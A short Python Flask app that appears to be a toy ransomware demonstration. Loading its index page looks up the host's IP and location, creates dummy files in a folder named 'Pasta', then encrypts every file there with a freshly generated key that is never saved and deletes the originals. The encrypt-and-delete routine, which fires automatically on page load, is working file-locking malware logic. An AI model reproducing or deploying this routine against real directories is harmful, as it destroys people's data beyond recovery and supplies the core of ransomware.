from flask import Flask, render_template 
from cryptography.fernet import Fernet
import requests
import os

app = Flask(__name__)

@app.route('/')
def index():
    api = "https://ipwhois.app/json/"
    request = requests.get(api).json()
    print(f"\033[36m [+]Endereco IP:\033[0;0m              {request['ip']}")
    request_ip = request['ip']
    request_city = request['city']
    request_org = request['org']

    os.chdir("Pasta")
    os.system("pwd")
    for i in range(5):
        os.system('touch {}.txt'.format(i+1))
        #pass
    os.chdir("..")

    def encrypt_file(file_path, key):
        with open(file_path, 'rb') as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(encrypted_data)
        os.remove(file_path)
        
    def encrypt_folder(folder_path, key):
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

    key = Fernet.generate_key()
    folder_path = "Pasta"
    encrypt_folder(folder_path, key)

    return render_template('index.html', ip=request_ip, city=request_city, org=request_org)

if __name__ == '__main__':
    app.run(debug=True)